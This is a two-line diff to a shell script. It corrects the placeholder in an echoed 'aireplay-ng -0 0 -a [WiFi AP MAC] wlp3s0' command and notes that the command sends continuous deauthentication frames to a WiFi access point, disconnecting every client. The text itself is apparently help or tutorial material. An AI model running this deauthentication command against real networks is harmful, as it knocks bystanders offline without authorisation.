@@ -1,2 +1,2 @@
-echo "aireplay-ng -0 0 -a [Device MAC] wlp3s0"
+echo "aireplay-ng -0 0 -a [WiFi AP MAC] wlp3s0"
 echo "The command above sends DeAuth message to a WiFi AP, and cut the connection of all devices that is connected to it."
